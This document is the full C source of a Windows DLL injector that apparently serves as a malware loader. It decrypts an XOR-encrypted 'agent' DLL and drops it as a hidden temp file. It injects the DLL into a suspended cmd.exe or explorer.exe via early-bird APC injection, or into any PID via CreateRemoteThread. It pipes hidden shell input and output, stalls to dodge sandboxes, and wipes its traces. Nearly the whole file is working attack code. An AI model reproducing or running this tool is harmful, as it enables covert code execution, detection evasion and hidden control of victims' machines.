#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ENV_HOST_SHELL    "WK_HOST_SHELL=1"
#define ENV_STDIN_WR_FMT  "WK_HOST_STDIN_WR=%llu"
#define ENV_STDOUT_RD_FMT "WK_HOST_STDOUT_RD=%llu"

static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

static void Hammer(void) {
    WCHAR b[256];
    DWORD l = 256;
    volatile int d = 0;
    int i;

    for (i = 0; i < 50; i++) {
        GetSystemDirectoryW(b, l);
        GetWindowsDirectoryW(b, l);
        GetTempPathW(l, b);
        GetTickCount();
        d += (int)b[0];
    }
}

static DWORD FindThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te;
    DWORD tid = 0;

    if (snap == INVALID_HANDLE_VALUE) return 0;
    te.dwSize = sizeof(te);
    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

static const char *BaseNameA(const char *path) {
    const char *p1 = strrchr(path, '\\');
    const char *p2 = strrchr(path, '/');
    const char *p = p1 ? p1 : p2;
    if (p2 && (!p1 || p2 > p1)) p = p2;
    return p ? p + 1 : path;
}

static int IsCmdTarget(const char *spec) {
    return lstrcmpiA(BaseNameA(spec), "cmd.exe") == 0;
}

static int ResolveTargetPath(const char *spec, char *out, DWORD cap) {
    DWORD n;
    if (!spec || !out || cap < 4) return 0;

    n = SearchPathA(NULL, spec, NULL, cap, out, NULL);
    if (n > 0 && n < cap) return 1;

    n = GetFullPathNameA(spec, cap, out, NULL);
    if (n == 0 || n >= cap) return 0;
    return 1;
}

static char *BuildHostEnv(HANDLE inWr, HANDLE outRd) {
    LPCH base = GetEnvironmentStringsA();
    LPCH p;
    size_t baseLen, extraLen, totalLen, off;
    char tmp1[96], tmp2[96];
    char *out;

    if (!base) return NULL;
    for (p = base; *p; p += lstrlenA(p) + 1) {}
    baseLen = (size_t)(p - base) + 1;

    snprintf(tmp1, sizeof(tmp1), ENV_STDIN_WR_FMT, (unsigned long long)(ULONG_PTR)inWr);
    snprintf(tmp2, sizeof(tmp2), ENV_STDOUT_RD_FMT, (unsigned long long)(ULONG_PTR)outRd);
    extraLen = lstrlenA(ENV_HOST_SHELL) + 1 + lstrlenA(tmp1) + 1 + lstrlenA(tmp2) + 1 + 1;
    totalLen = (baseLen - 1) + extraLen;

    out = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalLen);
    if (!out) {
        FreeEnvironmentStringsA(base);
        return NULL;
    }

    memcpy(out, base, baseLen - 1);
    off = baseLen - 1;
    lstrcpyA(out + off, ENV_HOST_SHELL); off += lstrlenA(ENV_HOST_SHELL) + 1;
    lstrcpyA(out + off, tmp1); off += lstrlenA(tmp1) + 1;
    lstrcpyA(out + off, tmp2); off += lstrlenA(tmp2) + 1;
    out[off] = 0;

    FreeEnvironmentStringsA(base);
    return out;
}

static int InjectRemoteLoadW(HANDLE hp, const WCHAR *dllPath) {
    SIZE_T sz = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID mem;
    HANDLE th;
    DWORD exitCode = 0;
    LPTHREAD_START_ROUTINE pLL;

    mem = VirtualAllocEx(hp, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 0;
    if (!WriteProcessMemory(hp, mem, dllPath, sz, NULL)) {
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
        return 0;
    }

    pLL = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
    th = CreateRemoteThread(hp, NULL, 0, pLL, mem, 0, NULL);
    if (!th) {
        VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
        return 0;
    }

    WaitForSingleObject(th, 10000);
    GetExitCodeThread(th, &exitCode);
    CloseHandle(th);
    VirtualFreeEx(hp, mem, 0, MEM_RELEASE);
    return exitCode != 0;
}

static int InjectExistingProcessW(const WCHAR *dllPath, DWORD pid) {
    HANDLE hp = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | SYNCHRONIZE,
        FALSE, pid
    );
    int ok;

    if (!hp) {
        printf("[-] OpenProcess(%lu): %lu\n", pid, GetLastError());
        return 0;
    }

    ok = InjectRemoteLoadW(hp, dllPath);
    if (!ok) printf("[-] Remote LoadLibraryW failed: %lu\n", GetLastError());
    CloseHandle(hp);
    return ok;
}

static int LaunchAndInjectW(const WCHAR *dllPath, const char *targetSpec) {
    char targetPath[MAX_PATH];
    int hostShell;
    HANDLE childInRd = NULL, childInWr = NULL, childOutRd = NULL, childOutWr = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    char *envBlock = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SIZE_T sz = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID mem = NULL;
    HANDLE hTh = NULL;
    LPVOID pLL;
    DWORD tid;

    if (!ResolveTargetPath(targetSpec, targetPath, sizeof(targetPath))) {
        printf("[-] Resolve target failed: %s\n", targetSpec);
        return 0;
    }
    hostShell = IsCmdTarget(targetPath);
    printf("[+] Target: %s\n", targetPath);

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (hostShell) {
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        if (!CreatePipe(&childInRd, &childInWr, &sa, 0)) return 0;
        if (!CreatePipe(&childOutRd, &childOutWr, &sa, 0)) {
            CloseHandle(childInRd);
            CloseHandle(childInWr);
            return 0;
        }
        si.hStdInput = childInRd;
        si.hStdOutput = childOutWr;
        si.hStdError = childOutWr;

        envBlock = BuildHostEnv(childInWr, childOutRd);
        if (!envBlock) {
            CloseHandle(childInRd);
            CloseHandle(childInWr);
            CloseHandle(childOutRd);
            CloseHandle(childOutWr);
            return 0;
        }
    }

    if (!CreateProcessA(targetPath, NULL, NULL, NULL, hostShell,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        envBlock, NULL, &si, &pi)) {
        printf("[-] CreateProcess(%s): %lu\n", targetPath, GetLastError());
        if (childInRd) CloseHandle(childInRd);
        if (childInWr) CloseHandle(childInWr);
        if (childOutRd) CloseHandle(childOutRd);
        if (childOutWr) CloseHandle(childOutWr);
        if (envBlock) HeapFree(GetProcessHeap(), 0, envBlock);
        return 0;
    }

    printf("[+] PID: %lu\n", pi.dwProcessId);
    if (envBlock) HeapFree(GetProcessHeap(), 0, envBlock);
    if (childInRd) CloseHandle(childInRd);
    if (childOutWr) CloseHandle(childOutWr);

    mem = VirtualAllocEx(pi.hProcess, NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) {
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }
    if (!WriteProcessMemory(pi.hProcess, mem, dllPath, sz, NULL)) {
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }

    pLL = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryW");
    tid = FindThread(pi.dwProcessId);
    if (!tid) tid = pi.dwThreadId;
    hTh = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hTh) {
        TerminateProcess(pi.hProcess, 0);
        goto cleanup;
    }

    Hammer();
    QueueUserAPC((PAPCFUNC)pLL, hTh, (ULONG_PTR)mem);
    ResumeThread(hTh);
    printf("[+] Injected\n");

    Sleep(3000);

cleanup:
    if (mem) VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
    if (childInWr) CloseHandle(childInWr);
    if (childOutRd) CloseHandle(childOutRd);
    if (hTh) CloseHandle(hTh);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    return 1;
}

static void Usage(void) {
    printf("Usage:\n");
    printf("  injector_enc.exe <enc_dll> [target]\n");
    printf("  injector_enc.exe <enc_dll> --pid <PID>\n");
    printf("Examples:\n");
    printf("  injector_enc.exe agent.dll.enc cmd.exe\n");
    printf("  injector_enc.exe agent.dll.enc explorer.exe\n");
    printf("  injector_enc.exe agent.dll.enc C:\\\\Windows\\\\explorer.exe\n");
    printf("  injector_enc.exe agent.dll.enc --pid 1234\n");
}

int main(int argc, char *argv[]) {
    const char *encFile = argc > 1 ? argv[1] : "agent.dll.enc";
    const char *target = "cmd.exe";
    DWORD pid = 0;
    char *end = NULL;
    HANDLE hf;
    DWORD sz;
    BYTE *enc = NULL;
    BYTE *dll = NULL;
    DWORD rd = 0;
    WCHAR tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    HANDLE hw = INVALID_HANDLE_VALUE;
    DWORD wr = 0;
    WCHAR fullDllPath[MAX_PATH];
    int ok = 0;
    int i;

    Hammer();
    Sleep(1500 + (GetTickCount() & 0xFFF));
    Hammer();

    if (argc > 2 && lstrcmpiA(argv[2], "--pid") == 0) {
        if (argc < 4) {
            Usage();
            return 1;
        }
        pid = strtoul(argv[3], &end, 10);
        if (!end || *end || pid == 0) {
            printf("[-] Invalid PID: %s\n", argv[3]);
            return 1;
        }
    } else if (argc > 2) {
        target = argv[2];
    }

    hf = CreateFileA(encFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open: %s\n", encFile);
        return 1;
    }

    sz = GetFileSize(hf, NULL);
    enc = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    dll = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!enc || !dll) {
        CloseHandle(hf);
        if (enc) HeapFree(GetProcessHeap(), 0, enc);
        if (dll) HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    ReadFile(hf, enc, sz, &rd, NULL);
    CloseHandle(hf);
    printf("[+] Loaded encrypted DLL: %lu bytes\n", sz);

    for (i = 0; i < (int)sz; i++) dll[i] = enc[i] ^ g_key[i % 16];
    HeapFree(GetProcessHeap(), 0, enc);
    printf("[+] Decrypted in memory\n");

    GetTempPathW(MAX_PATH, tmpPath);
    GetTempFileNameW(tmpPath, L"tmp", 0, tmpFile);

    hw = CreateFileW(tmpFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hw == INVALID_HANDLE_VALUE) {
        SecureZeroMemory(dll, sz);
        HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }
    WriteFile(hw, dll, sz, &wr, NULL);
    CloseHandle(hw);
    hw = INVALID_HANDLE_VALUE;
    printf("[+] Wrote temp DLL: %S\n", tmpFile);

    if (!GetFullPathNameW(tmpFile, MAX_PATH, fullDllPath, NULL)) {
        DeleteFileW(tmpFile);
        SecureZeroMemory(dll, sz);
        HeapFree(GetProcessHeap(), 0, dll);
        return 1;
    }

    if (pid) {
        printf("[+] Existing PID: %lu\n", pid);
        ok = InjectExistingProcessW(fullDllPath, pid);
        if (ok) printf("[+] Injected\n");
    } else {
        ok = LaunchAndInjectW(fullDllPath, target);
        if (ok) printf("[+] Temp file deleted, memory cleared. Done.\n");
    }

    DeleteFileW(tmpFile);
    SecureZeroMemory(dll, sz);
    HeapFree(GetProcessHeap(), 0, dll);
    if (!ok) return 1;
    if (pid) printf("[+] Temp file deleted, memory cleared. Done.\n");
    return 0;
}
